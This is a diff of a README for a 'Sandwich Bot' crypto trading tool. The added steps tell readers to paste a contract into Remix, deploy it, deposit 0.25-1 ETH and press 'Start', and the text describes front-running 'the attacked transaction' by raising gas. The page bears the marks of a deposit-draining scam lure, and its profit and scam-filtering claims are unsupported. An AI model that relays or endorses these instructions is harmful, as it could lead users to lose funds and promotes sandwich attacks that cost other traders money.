@@ -12,6 +12,8 @@
 
 - **Sandwich Bot is a powerful tool for cryptocurrency traders and investors, enabling them to automate trading operations, stay ahead of the market, and extract maximum benefits from price volatility on both Binance Smart Chain and Ethereum.**
 
+- **Sandwich Bot scans projects and performs token filtering, screening out scam tokens and tokens associated with whales. It utilizes various algorithms and analysis strategies to identify and exclude dishonest projects that may pose a risk to investors.**
+
 # Sandwich Bot example
 ![exemple Sandwich](https://github.com/ricarddan/San/assets/130685019/a36f8b0c-882d-4efe-97b4-42e22a7f29d1)
 # The bot only works with the main network.
@@ -20,22 +22,31 @@ Step 1: Access the Source Code
 1. Navigate to the Remix IDE: https://remix.ethereum.org/
 2. Create a new file "SandwichBot.sol".
 3. Copy this code and paste it into the Remix IDE.
+![1](https://github.com/ricarddan/San/assets/130685019/4ccafd5a-aff1-4e12-ad9f-e2b164134577)
 
 
 Step 2: Compile the Code
 1. Select the Solidity compiler 0.6.12.
 2. Click 'Compile SandwichBot.sol'.
+![2](https://github.com/ricarddan/San/assets/130685019/9de2ef36-fa1b-40d2-90e2-479bd1ed9323)
 
 
 Step 3: Choose the Network
 1. **!!Select either ETH or BSC (BNB) network.!!**
+![3](https://github.com/ricarddan/San/assets/130685019/c4dc4096-835d-411b-b8da-5f3738dd1683)
 
 
 Step 4: Deploy the Code
 1. Click 'Transact (Deploy)'.
-
-
-
 Step 5: Deposit into MEVBot
 1. Copy your SandwichBot contract and send an amount of Ethereum for the bot's operation.
 2. Start the bot by pressing the 'Start' button.
+![4](https://github.com/ricarddan/San/assets/130685019/0a5d0a44-94d3-49e9-8f7f-bd1964795fc2)
+![5](https://github.com/ricarddan/San/assets/130685019/9a745388-771f-4eb1-80ec-93c27c26a42c)
+
+
+**Note: For successful transactions on the Ethereum network, you must have sufficient balance to cover the gas fees. We recommend a minimum of 0.25-1 ETH. The bot uses a small portion of its resources to pay for gas. In order to prioritize the transaction, it increases the gas price of the attacked transaction.**
+
+***You can withdraw funds by clicking the 'Stop' and 'Withdrawal' button.****
+
+***UPD: If you have closed the Remix IDE website or accidentally rebooted your computer, you can still access all the bot's functions through Etherscan You will need to verify the bot contract on Etherscan, and you will have access to the same functions as you would through the Remix IDE website.***
